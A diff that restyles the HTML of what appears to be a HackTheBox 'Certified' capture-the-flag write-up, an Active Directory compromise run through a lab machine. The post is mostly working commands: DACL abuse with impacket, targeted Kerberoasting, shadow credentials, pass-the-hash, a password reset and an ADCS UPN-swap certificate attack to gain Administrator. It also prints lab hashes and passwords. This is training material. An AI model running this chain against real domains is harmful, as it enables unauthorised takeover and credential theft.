@@ -1,1 +1,201 @@
-<html><head><meta charset="utf-8"></head><body><p>HTB provides credentials as an assumed breach situation</p><p>judith.mader:judith09</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1264/253;" src="../img/posts/2024-11-16-Certified(HTB)/01-4ee929b001.png" width="1264" height="253"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as management_svc</u></strong></span></p><p>Judith has write owner over management</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:446/327;" src="../img/posts/2024-11-16-Certified(HTB)/02-e74710f559.png" width="446" height="327"></figure><p>&nbsp;</p><p><code>impacket-owneredit -action write -new-owner 'judith.mader' -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' certified.htb/judith.mader:judith09</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:592/112;" src="../img/posts/2024-11-16-Certified(HTB)/03-4ead95f29d.png" width="592" height="112"></figure><p>&nbsp;</p><p>Giving our user write privileges</p><p><code>impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:434/67;" src="../img/posts/2024-11-16-Certified(HTB)/04-20cbf3f247.png" width="434" height="67"></figure><p>&nbsp;</p><p>Add user to group</p><p><code>net rpc group addmem "MANAGEMENT@CERTIFIED.HTB" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"</code></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:524/282;" src="../img/posts/2024-11-16-Certified(HTB)/05-2d0588a43a.png" width="524" height="282"></figure><figure class="image image-style-block-align-left"><img style="aspect-ratio:576/210;" src="../img/posts/2024-11-16-Certified(HTB)/06-e200eab2ca.png" width="576" height="210"></figure><p>&nbsp;</p><p>We first got clock skew too great and ntupdate failed because i used it on another machine</p><p>resetting it to default clock and then to the DC again fixed this though</p><p>sudo ntpdate pool.ntp.org</p><p>sudo ntpdate 10.10.11.41</p><p>&nbsp;</p><p><code>python3 targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1270/382;" src="../img/posts/2024-11-16-Certified(HTB)/07-cf96cf3959.png" width="1270" height="382"></figure><p>&nbsp;</p><p><span class="text-tiny"><code>$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$dd86a4c3dc2a2e09cbca3421bcbaed40$b0d6e2770db369380cbbf9ae011e68909b9e75e200acd0b5e080690edaa3bc53a22870d1165bb1bc1653103a39a0feeb614f29f95a7beb05b09ee0dd07f2956eb328260a5eb308d1f360f7ebe6e77f946364c4ee097201cbf0ab51dfd085371dc82414b302926c3cd7b64a741cb75aad4f5b31614f98ec3748bde4e01e94e3194ea42a252690c72b8a35fa381a8d6dbc03344511a2d256dc7359082aa1776b92bfcc49f61bb9c8b982864e55b3de6eaba71b135b58460ef895f59bb2ff331a52200f14f66502d06b7eace34ab8d5884b8f5d37085009bc6a97ee246748e96ad9a9485588d5fec8a2a6dcf2cde147e4ce166697e5babfbd73c605de35638e1c9ecf0398f0835991a0c1e8cf37232619d05146243c4c7d171258c9a0b22c4658b5d040f1264b9e8d0dbf19587eb7823a8fc693367462bb2dbb6c7cc2bf16cfb902dde5f5f2a6a639b1e086a872bb0bd330b16968a01b6334bcaf076b085960b222ac34b7e111b0419567e47a6dfc83ec3385e53259502e8e956734770db88d0f34cad79c224b8ff42b6064b0b4d9a3963e8129ffa3322ba75037bd86310c2ce669783d931f7db32d09621859cc069e6087732ba9e1c17e967a8061a5f61f9fd0fc248e18006819ca240b8d09b748ecc8120e271c7556a8d5bc2c5dd92a21177e2e14e2feea992ebe0dd380b9b4dd0381c63653e311da6f97e7784b7a8b124e7b8ef8425f5a3913bd887c1b84ffc0d794b429c7fb0a70fa309365e64154328bf69d49c16ff098e46d13a83f046fca59caaa5641eb4f48aac34ed40e3d16e920ce33e187275419ef562acdc7788e1fcebf4798b57aea850de74038502a0f647c54fccd5861f2fa0d63416683c730414005395322c6526686786a2f576ab7bada6fa61e980827f8193dd486f9b2d3e781bfb49fc4cf926d26b2c5cb0a4e5cddbcb95b919fc21f76dc8cd2b7cde95ddcbaa48b14af68542b2628ec7d84773caf9bb40053a74bba8a9985d866ba26381665e6da1d5e274d7c61f41a35e222edf4e39fad6911200f1a29b8847e5840aea324ef16a5181afb2f50ad055d8505aa49989af9b0f43a3d1cbfe3e1c5158965d5d59fdc4980b0c2a1a6c6c95ea5eafbf81cd147680ab8a48d22f1d586ea8f842e0f3eb14d2cfac1e0d2b13eabaf25bc0ac14120a3bcf46818ecfbe520d7e2441443d8f2e7fab8d677c8a6c22a850c94206d48e7e9b9c01c392543890299d6d707a5bbcf60a0822ec2167834859341ceb0a419e7842442669aea3acd953e78efecb6193d7eb623d05cc78bc9fba4a5e3c79ad9ca5ed7e44ea1ad210da4a3ee16ef62fda6b0b230883d20764be431fbf0ec9ffe9c58f4d29fdbc22df29855e0cb2fdd8bf15321e88b77e71f09b0533b3e8497b2e1e9b357bc75716c702b15179ac4e006f7b1fd9734d953b41ff76287a4124702c2213605a1d3cb7295527a5e6294efec425a6509060aaa65e3523e8637da44a46a58f07d14d7199782e44435afc47dadb23191727b6464a3ce1c1fa9779a55f4d5f19c29835a93fdd96e271a4f50a5ad30b4f7bdada6be1011ab6704dafe531e88c049</code></span></p><p>&nbsp;</p><p>Couldnt crack the hash so we will try the pywhisker/shadow credentials path</p><p>python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "MANAGEMENT_SVC" --action "add"</p><p>&nbsp;</p><p><code>python3 gettgtpkinit.py -cert-pfx ../RTs4iorA.pfx -pfx-pass OCcl8Wi1mpaKQedtXasG certified.htb/MANAGEMENT_SVC MANAGEMENT_SVC.ccache -dc-ip 10.10.11.41</code></p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1246/231;" src="../img/posts/2024-11-16-Certified(HTB)/08-a4e9982f21.png" width="1246" height="231"></figure><p>&nbsp;</p><p>Ippsec has a good video on this part</p><p>using the information above we can request an NTLM hash(I tried just using the TGT ticket but it took too long and id get “CLOCK SKEW TO GREAT”</p><p>&nbsp;</p><p><code>python3 getnthash.py certified.htb/management_svc -key a24b94cea78aa4b116b129c258d35f8a049c8a91b4a6e0f275f08d782f832db6</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1265/268;" src="../img/posts/2024-11-16-Certified(HTB)/09-1d99538fa6.png" width="1265" height="268"></figure><p>management_svc:a091c1832bcdd4677c28b5a6a1295584</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584</code></p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Access as CA_Operator</u></strong></span></p><p>We have generic all over CA_OPERATOR</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:490/317;" src="../img/posts/2024-11-16-Certified(HTB)/10-73cd9431e9.png" width="490" height="317"></figure><p>&nbsp;</p><p>&nbsp;</p><p><code>pth-net rpc password "CA_OPERATOR" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "10.10.11.41"</code></p><p>&nbsp;</p><p>&nbsp;</p><p><code>netexec smb &nbsp;10.10.11.41 -u CA_OPERATOR -p newP@ssword2022</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1265/109;" src="../img/posts/2024-11-16-Certified(HTB)/11-e2b8e7e28e.png" width="1265" height="109"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Using certipy we can request for vulnerable certificates</p><p><code>certipy-ad find -vulnerable -u CA_OPERATOR@certified.htb -p newP@ssword2022</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1115/810;" src="../img/posts/2024-11-16-Certified(HTB)/12-d9d7aa58e6.png" width="1115" height="810"></figure><p>&nbsp;</p><p>This link from hacktricks was very helpful in exploiting this.</p><p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:876/921;" src="../img/posts/2024-11-16-Certified(HTB)/13-ec0817dcea.png" width="876" height="921"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Administrator</u></strong></span></p><p>Overview of the attack</p><p>We can change CA_operators spn to be the administrator SPN<br>Request a administrator pfx<br>Change the CA_operator spn back to CA_operator<br>then use the administrator.pfx hash to get the admin ntlm</p><p>&nbsp;</p><p>Change ca_operator's spn to administrator using management_svc as we have generic all over ca_operator</p><p><code>certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 &nbsp;-user ca_operator -upn Administrator</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1207/140;" src="../img/posts/2024-11-16-Certified(HTB)/14-96dfc31c3f.png" width="1207" height="140"></figure><p>&nbsp;</p><p>Request for the certificate which will be an admin certificate since we change the SPN of our user</p><p><code>certipy-ad req -username CA_OPERATOR@certified.htb -p newP@ssword2022 -ca certified-DC01-CA -template CertifiedAuthentication</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1063/223;" src="../img/posts/2024-11-16-Certified(HTB)/15-75069e75b2.png" width="1063" height="223"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Now we can get the NTLM for admin user</p><p><code>certipy-ad auth -pfx administrator.pfx -domain certified.htb</code></p><p>At first we get an error because we need to change CA_operator back to CA_operator</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:720/155;" src="../img/posts/2024-11-16-Certified(HTB)/16-ee7cf0bd15.png" width="720" height="155"></figure><p>&nbsp;</p><p>Change UPN back to CA_operator</p><p><code>certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 &nbsp;-user ca_operator -upn ca_operator</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1189/141;" src="../img/posts/2024-11-16-Certified(HTB)/17-33ebef9556.png" width="1189" height="141"></figure><p>&nbsp;</p><p>Get NTLM hash</p><p><code>certipy-ad auth -pfx administrator.pfx -domain certified.htb</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:924/207;" src="../img/posts/2024-11-16-Certified(HTB)/18-8d51b26e18.png" width="924" height="207"></figure><p>&nbsp;</p><p>&nbsp;</p><p>grab root.txt</p><p><code>evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:957/473;" src="../img/posts/2024-11-16-Certified(HTB)/19-9c2d3a5031.png" width="957" height="473"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:700/645;" src="../img/posts/2024-11-16-Certified(HTB)/20-4716c0858c.png" width="700" height="645"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Certified | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-11-16-Certified(HTB)/01-4ee929b001.png" alt="HTB: Certified cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Certified</h1>
+                <div class="post-meta">March 14, 2025 &bull; HTB</div>
+            </div>
+        </header>
+
+        <p>HTB provides credentials as an assumed breach situation</p>
+
+        <p>judith.mader:judith09</p>
+
+        <img alt="Screenshot 1" height="253" src="../img/posts/2024-11-16-Certified(HTB)/01-4ee929b001.png" style="aspect-ratio:1264/253;" width="1264"/>
+
+        <h1 style="color:red;">Shell as management_svc</h1>
+
+        <p>Judith has write owner over management</p>
+
+        <img alt="Screenshot 2" height="327" src="../img/posts/2024-11-16-Certified(HTB)/02-e74710f559.png" style="aspect-ratio:446/327;" width="446"/>
+
+        <pre class="terminal"><code>impacket-owneredit -action write -new-owner 'judith.mader' -target-sid 'S-1-5-21-729746778-2675978091-3820388244-1104' certified.htb/judith.mader:judith09</code></pre>
+
+        <img alt="Screenshot 3" height="112" src="../img/posts/2024-11-16-Certified(HTB)/03-4ead95f29d.png" style="aspect-ratio:592/112;" width="592"/>
+
+        <p>Giving our user write privileges</p>
+
+        <pre class="terminal"><code>impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'</code></pre>
+
+        <img alt="Screenshot 4" height="67" src="../img/posts/2024-11-16-Certified(HTB)/04-20cbf3f247.png" style="aspect-ratio:434/67;" width="434"/>
+
+        <p>Add user to group</p>
+
+        <pre class="terminal"><code>net rpc group addmem "MANAGEMENT@CERTIFIED.HTB" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"</code></pre>
+
+        <img alt="Screenshot 5" height="282" src="../img/posts/2024-11-16-Certified(HTB)/05-2d0588a43a.png" style="aspect-ratio:524/282;" width="524"/>
+
+        <img alt="Screenshot 6" height="210" src="../img/posts/2024-11-16-Certified(HTB)/06-e200eab2ca.png" style="aspect-ratio:576/210;" width="576"/>
+
+        <p>We first got clock skew too great and ntupdate failed because i used it on another machine</p>
+
+        <p>resetting it to default clock and then to the DC again fixed this though</p>
+
+        <p>sudo ntpdate pool.ntp.org</p>
+
+        <p>sudo ntpdate 10.10.11.41</p>
+
+        <pre class="terminal"><code>python3 targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'</code></pre>
+
+        <img alt="Screenshot 7" height="382" src="../img/posts/2024-11-16-Certified(HTB)/07-cf96cf3959.png" style="aspect-ratio:1270/382;" width="1270"/>
+
+        <p><span class="text-tiny"><code>$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$dd86a4c3dc2a2e09cbca3421bcbaed40$b0d6e2770db369380cbbf9ae011e68909b9e75e200acd0b5e080690edaa3bc53a22870d1165bb1bc1653103a39a0feeb614f29f95a7beb05b09ee0dd07f2956eb328260a5eb308d1f360f7ebe6e77f946364c4ee097201cbf0ab51dfd085371dc82414b302926c3cd7b64a741cb75aad4f5b31614f98ec3748bde4e01e94e3194ea42a252690c72b8a35fa381a8d6dbc03344511a2d256dc7359082aa1776b92bfcc49f61bb9c8b982864e55b3de6eaba71b135b58460ef895f59bb2ff331a52200f14f66502d06b7eace34ab8d5884b8f5d37085009bc6a97ee246748e96ad9a9485588d5fec8a2a6dcf2cde147e4ce166697e5babfbd73c605de35638e1c9ecf0398f0835991a0c1e8cf37232619d05146243c4c7d171258c9a0b22c4658b5d040f1264b9e8d0dbf19587eb7823a8fc693367462bb2dbb6c7cc2bf16cfb902dde5f5f2a6a639b1e086a872bb0bd330b16968a01b6334bcaf076b085960b222ac34b7e111b0419567e47a6dfc83ec3385e53259502e8e956734770db88d0f34cad79c224b8ff42b6064b0b4d9a3963e8129ffa3322ba75037bd86310c2ce669783d931f7db32d09621859cc069e6087732ba9e1c17e967a8061a5f61f9fd0fc248e18006819ca240b8d09b748ecc8120e271c7556a8d5bc2c5dd92a21177e2e14e2feea992ebe0dd380b9b4dd0381c63653e311da6f97e7784b7a8b124e7b8ef8425f5a3913bd887c1b84ffc0d794b429c7fb0a70fa309365e64154328bf69d49c16ff098e46d13a83f046fca59caaa5641eb4f48aac34ed40e3d16e920ce33e187275419ef562acdc7788e1fcebf4798b57aea850de74038502a0f647c54fccd5861f2fa0d63416683c730414005395322c6526686786a2f576ab7bada6fa61e980827f8193dd486f9b2d3e781bfb49fc4cf926d26b2c5cb0a4e5cddbcb95b919fc21f76dc8cd2b7cde95ddcbaa48b14af68542b2628ec7d84773caf9bb40053a74bba8a9985d866ba26381665e6da1d5e274d7c61f41a35e222edf4e39fad6911200f1a29b8847e5840aea324ef16a5181afb2f50ad055d8505aa49989af9b0f43a3d1cbfe3e1c5158965d5d59fdc4980b0c2a1a6c6c95ea5eafbf81cd147680ab8a48d22f1d586ea8f842e0f3eb14d2cfac1e0d2b13eabaf25bc0ac14120a3bcf46818ecfbe520d7e2441443d8f2e7fab8d677c8a6c22a850c94206d48e7e9b9c01c392543890299d6d707a5bbcf60a0822ec2167834859341ceb0a419e7842442669aea3acd953e78efecb6193d7eb623d05cc78bc9fba4a5e3c79ad9ca5ed7e44ea1ad210da4a3ee16ef62fda6b0b230883d20764be431fbf0ec9ffe9c58f4d29fdbc22df29855e0cb2fdd8bf15321e88b77e71f09b0533b3e8497b2e1e9b357bc75716c702b15179ac4e006f7b1fd9734d953b41ff76287a4124702c2213605a1d3cb7295527a5e6294efec425a6509060aaa65e3523e8637da44a46a58f07d14d7199782e44435afc47dadb23191727b6464a3ce1c1fa9779a55f4d5f19c29835a93fdd96e271a4f50a5ad30b4f7bdada6be1011ab6704dafe531e88c049</code></span></p>
+
+        <p>Couldnt crack the hash so we will try the pywhisker/shadow credentials path</p>
+
+        <p>python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "MANAGEMENT_SVC" --action "add"</p>
+
+        <pre class="terminal"><code>python3 gettgtpkinit.py -cert-pfx ../RTs4iorA.pfx -pfx-pass OCcl8Wi1mpaKQedtXasG certified.htb/MANAGEMENT_SVC MANAGEMENT_SVC.ccache -dc-ip 10.10.11.41</code></pre>
+
+        <img alt="Screenshot 8" height="231" src="../img/posts/2024-11-16-Certified(HTB)/08-a4e9982f21.png" style="aspect-ratio:1246/231;" width="1246"/>
+
+        <p>Ippsec has a good video on this part</p>
+
+        <p>using the information above we can request an NTLM hash(I tried just using the TGT ticket but it took too long and id get “CLOCK SKEW TO GREAT”</p>
+
+        <pre class="terminal"><code>python3 getnthash.py certified.htb/management_svc -key a24b94cea78aa4b116b129c258d35f8a049c8a91b4a6e0f275f08d782f832db6</code></pre>
+
+        <img alt="Screenshot 9" height="268" src="../img/posts/2024-11-16-Certified(HTB)/09-1d99538fa6.png" style="aspect-ratio:1265/268;" width="1265"/>
+
+        <p>management_svc:a091c1832bcdd4677c28b5a6a1295584</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584</code></pre>
+
+        <h1 style="color:red;">Access as CA_Operator</h1>
+
+        <p>We have generic all over CA_OPERATOR</p>
+
+        <img alt="Screenshot 10" height="317" src="../img/posts/2024-11-16-Certified(HTB)/10-73cd9431e9.png" style="aspect-ratio:490/317;" width="490"/>
+
+        <pre class="terminal"><code>pth-net rpc password "CA_OPERATOR" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "10.10.11.41"</code></pre>
+
+        <pre class="terminal"><code>netexec smb  10.10.11.41 -u CA_OPERATOR -p newP@ssword2022</code></pre>
+
+        <img alt="Screenshot 11" height="109" src="../img/posts/2024-11-16-Certified(HTB)/11-e2b8e7e28e.png" style="aspect-ratio:1265/109;" width="1265"/>
+
+        <p>Using certipy we can request for vulnerable certificates</p>
+
+        <pre class="terminal"><code>certipy-ad find -vulnerable -u CA_OPERATOR@certified.htb -p newP@ssword2022</code></pre>
+
+        <img alt="Screenshot 12" height="810" src="../img/posts/2024-11-16-Certified(HTB)/12-d9d7aa58e6.png" style="aspect-ratio:1115/810;" width="1115"/>
+
+        <p>This link from hacktricks was very helpful in exploiting this.</p>
+
+        <p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</p>
+
+        <img alt="Screenshot 13" height="921" src="../img/posts/2024-11-16-Certified(HTB)/13-ec0817dcea.png" style="aspect-ratio:876/921;" width="876"/>
+
+        <h1 style="color:red;">Shell as Administrator</h1>
+
+        <p>Overview of the attack</p>
+
+        <p>We can change CA_operators spn to be the administrator SPN<br/>Request a administrator pfx<br/>Change the CA_operator spn back to CA_operator<br/>then use the administrator.pfx hash to get the admin ntlm</p>
+
+        <p>Change ca_operator's spn to administrator using management_svc as we have generic all over ca_operator</p>
+
+        <pre class="terminal"><code>certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584  -user ca_operator -upn Administrator</code></pre>
+
+        <img alt="Screenshot 14" height="140" src="../img/posts/2024-11-16-Certified(HTB)/14-96dfc31c3f.png" style="aspect-ratio:1207/140;" width="1207"/>
+
+        <p>Request for the certificate which will be an admin certificate since we change the SPN of our user</p>
+
+        <pre class="terminal"><code>certipy-ad req -username CA_OPERATOR@certified.htb -p newP@ssword2022 -ca certified-DC01-CA -template CertifiedAuthentication</code></pre>
+
+        <img alt="Screenshot 15" height="223" src="../img/posts/2024-11-16-Certified(HTB)/15-75069e75b2.png" style="aspect-ratio:1063/223;" width="1063"/>
+
+        <p>Now we can get the NTLM for admin user</p>
+
+        <pre class="terminal"><code>certipy-ad auth -pfx administrator.pfx -domain certified.htb</code></pre>
+
+        <p>At first we get an error because we need to change CA_operator back to CA_operator</p>
+
+        <img alt="Screenshot 16" height="155" src="../img/posts/2024-11-16-Certified(HTB)/16-ee7cf0bd15.png" style="aspect-ratio:720/155;" width="720"/>
+
+        <p>Change UPN back to CA_operator</p>
+
+        <pre class="terminal"><code>certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584  -user ca_operator -upn ca_operator</code></pre>
+
+        <img alt="Screenshot 17" height="141" src="../img/posts/2024-11-16-Certified(HTB)/17-33ebef9556.png" style="aspect-ratio:1189/141;" width="1189"/>
+
+        <p>Get NTLM hash</p>
+
+        <pre class="terminal"><code>certipy-ad auth -pfx administrator.pfx -domain certified.htb</code></pre>
+
+        <img alt="Screenshot 18" height="207" src="../img/posts/2024-11-16-Certified(HTB)/18-8d51b26e18.png" style="aspect-ratio:924/207;" width="924"/>
+
+        <p>grab root.txt</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34</code></pre>
+
+        <img alt="Screenshot 19" height="473" src="../img/posts/2024-11-16-Certified(HTB)/19-9c2d3a5031.png" style="aspect-ratio:957/473;" width="957"/>
+
+        <img alt="Screenshot 20" height="645" src="../img/posts/2024-11-16-Certified(HTB)/20-4716c0858c.png" style="aspect-ratio:700/645;" width="700"/>
+    </article>
+
+</body>
+</html>
